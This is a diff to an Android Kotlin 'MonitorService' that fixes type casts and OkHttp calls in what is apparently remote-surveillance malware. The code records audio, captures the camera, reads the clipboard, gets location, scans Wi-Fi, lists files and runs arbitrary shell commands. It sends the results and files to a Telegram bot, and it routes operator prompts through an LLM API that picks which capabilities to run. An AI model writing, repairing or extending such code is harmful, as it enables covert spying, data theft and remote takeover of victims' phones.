@@ -35,6 +35,7 @@ import okhttp3.Request
 import okhttp3.RequestBody
 import okhttp3.Response
 import java.io.File
+import java.nio.charset.Charsets
 import java.util.ArrayList
 import java.util.HashMap
 import java.util.List
@@ -341,7 +342,7 @@ class MonitorService : Service() {
             "audio" -> recordAudio(args as Map<String, Any>)
             "camera" -> captureCamera(args as Map<String, Any>)
             "shell" -> runShell(args["command"] as? String ?: "")
-            else -> HashMap<String, Any>().apply { put("error", "Unknown capability: $capability") }
+            else -> HashMap<String, Any>().apply { put("error", "Unknown capability: $capability") } as Map<String, Any>
         }
     }
 
@@ -464,7 +465,7 @@ class MonitorService : Service() {
         return when (action) {
             "list" -> {
                 val dir = File(path)
-                if (!dir.exists() || !dir.isDirectory) HashMap<String, Any>().apply { put("error", "Not a directory") }
+                if (!dir.exists() || !dir.isDirectory) HashMap<String, Any>().apply { put("error", "Not a directory") } as Map<String, Any>
                 else {
                     val files = dir.listFiles()?.mapNotNull { f ->
                         try {
@@ -481,10 +482,10 @@ class MonitorService : Service() {
                         put("files", files.take(200))
                         put("path", path)
                         put("count", files.size)
-                    }
+                    } as Map<String, Any>
                 }
             }
-            else -> HashMap<String, Any>().apply { put("error", "Unknown action") }
+            else -> HashMap<String, Any>().apply { put("error", "Unknown action") } as Map<String, Any>
         }
     }
 
@@ -500,10 +501,10 @@ class MonitorService : Service() {
                 put("caps", r.capabilities)
             }
         }
-        HashMap<String, Any>().apply {
+        return HashMap<String, Any>().apply {
             put("networks", networks)
             put("count", networks.size)
-        }
+        } as Map<String, Any>
     }
 
     private fun getClipboard(): Map<String, Any> {
@@ -513,12 +514,12 @@ class MonitorService : Service() {
             return HashMap<String, Any>().apply {
                 put("text", clip)
                 put("has_content", clip.isNotEmpty())
-            }
+            } as Map<String, Any>
         }
         return HashMap<String, Any>().apply {
             put("text", "")
             put("has_content", false)
-        }
+        } as Map<String, Any>
     }
 
     private fun getLocation(): Map<String, Any> {
@@ -536,7 +537,7 @@ class MonitorService : Service() {
                     put("time", lastLoc.time)
                     put("provider", provider)
                     put("note", "Last known location (may be stale)")
-                }
+                } as Map<String, Any>
             }
 
             val latch = CountDownLatch(1)
@@ -549,7 +550,7 @@ class MonitorService : Service() {
                     m["acc"] = location.accuracy
                     m["time"] = location.time
                     m["provider"] = provider
-                    result = m
+                    result = m as Map<String, Any>
                     latch.countDown()
                 }
                 override fun onProviderDisabled(provider: String) { latch.countDown() }
@@ -560,14 +561,14 @@ class MonitorService : Service() {
             try {
                 locationManager?.requestSingleUpdate(provider, listener, null)
                 if (latch.await(5, TimeUnit.SECONDS)) {
-                    return result ?: HashMap<String, Any>().apply { put("error", "Location request timed out") }
+                    return result ?: HashMap<String, Any>().apply { put("error", "Location request timed out") } as Map<String, Any>
                 }
-                return HashMap<String, Any>().apply { put("error", "Location timeout - no fix in 5s") }
+                return HashMap<String, Any>().apply { put("error", "Location timeout - no fix in 5s") } as Map<String, Any>
             } catch (e: Exception) {
-                return HashMap<String, Any>().apply { put("error", e.message ?: "Location error") }
+                return HashMap<String, Any>().apply { put("error", e.message ?: "Location error") } as Map<String, Any>
             }
         } catch (e: Exception) {
-            return HashMap<String, Any>().apply { put("error", e.message ?: "Location error") }
+            return HashMap<String, Any>().apply { put("error", e.message ?: "Location error") } as Map<String, Any>
         }
     }
 
@@ -594,16 +595,16 @@ class MonitorService : Service() {
                         put("status", "recording")
                         put("duration", duration)
                         put("file", outputFile.absolutePath)
-                    }
+                    } as Map<String, Any>
                 } catch (e: Exception) {
-                    HashMap<String, Any>().apply { put("error", e.message ?: "Audio start failed") }
+                    HashMap<String, Any>().apply { put("error", e.message ?: "Audio start failed") } as Map<String, Any>
                 }
             }
             "stop" -> {
                 stopRecording()
-                HashMap<String, Any>().apply { put("status", "stopped") }
+                HashMap<String, Any>().apply { put("status", "stopped") } as Map<String, Any>
             }
-            else -> HashMap<String, Any>().apply { put("error", "Unknown audio action") }
+            else -> HashMap<String, Any>().apply { put("error", "Unknown audio action") } as Map<String, Any>
         }
     }
 
@@ -622,18 +623,18 @@ class MonitorService : Service() {
             put("note", "Camera2 API needed")
             put("file", outputFile.absolutePath)
             put("camera_id", cameraId)
-        }
+        } as Map<String, Any>
     }
 
     private fun getScreenshot(): Map<String, Any> {
         return HashMap<String, Any>().apply {
             put("status", "requires_mediaprojection")
             put("note", "Requires MediaProjection permission")
-        }
+        } as Map<String, Any>
     }
 
     private fun runShell(cmd: String): Map<String, Any> {
-        if (cmd.isBlank()) return HashMap<String, Any>().apply { put("error", "No command") }
+        if (cmd.isBlank()) return HashMap<String, Any>().apply { put("error", "No command") } as Map<String, Any>
         try {
             val process = Runtime.getRuntime().exec(cmd)
             val output = process.inputStream.readAllBytes().toString(Charsets.UTF_8)
@@ -643,9 +644,9 @@ class MonitorService : Service() {
                 put("exit", exitCode)
                 put("output", output)
                 put("error", error)
-            }
+            } as Map<String, Any>
         } catch (e: Exception) {
-            return HashMap<String, Any>().apply { put("error", e.message ?: "unknown error") }
+            return HashMap<String, Any>().apply { put("error", e.message ?: "unknown error") } as Map<String, Any>
         }
     }
 
@@ -711,7 +712,7 @@ class MonitorService : Service() {
                 put("parse_mode", "Markdown")
             }
             val jsonBody = gson.toJson(params)
-            val mediaType = MediaType.parse("application/json")
+            val mediaType = MediaType.Companion.parse("application/json")
             val body = RequestBody.create(mediaType, jsonBody)
             val req = Request.Builder().url(url).post(body).build()
             client.newCall(req).execute().use { Log.d("Telegram", "Sent to $chatId") }
@@ -729,7 +730,7 @@ class MonitorService : Service() {
                     .addFormDataPart("chat_id", chatId.toString())
                     .addFormDataPart("caption", caption)
                     .addFormDataPart("document", filename,
-                        RequestBody.create(MediaType.parse("text/plain"), file.readBytes()))
+                        RequestBody.create(MediaType.Companion.parse("text/plain"), file.readBytes()))
                     .build()
 
                 val req = Request.Builder().url("$TELEGRAM_API$BOT_TOKEN/sendDocument").post(requestBody).build()
@@ -799,7 +800,7 @@ Only respond with valid JSON, no extra text."""
             }
 
             val jsonBody = gson.toJson(payload)
-            val mediaType = MediaType.parse("application/json")
+            val mediaType = MediaType.Companion.parse("application/json")
             val body = RequestBody.create(mediaType, jsonBody)
             val req = Request.Builder()
                 .url(NVIDIA_API_URL)
@@ -865,7 +866,7 @@ Only respond with valid JSON, no extra text."""
                         put("reasoning", reasoning)
                         put("result", result)
                         put("status", "completed")
-                    }
+                    } as Map<String, Any>
                     results.add(m)
                 } catch (e: Exception) {
                     val m = HashMap<String, Any>().apply {
@@ -874,7 +875,7 @@ Only respond with valid JSON, no extra text."""
                         put("reasoning", reasoning)
                         put("error", e.message ?: "unknown error")
                         put("status", "failed")
-                    }
+                    } as Map<String, Any>
                     results.add(m)
                 }
             }
@@ -883,9 +884,9 @@ Only respond with valid JSON, no extra text."""
             results.add(HashMap<String, Any>().apply {
                 put("error", e.message ?: "unknown error")
                 put("raw_response", aiResponse)
-            })
+            } as Map<String, Any>)
         }
-        return results
+        return results as List<Map<String, Any>>
     }
 
     private fun handleAiCommand(chatId: Long, prompt: String) {
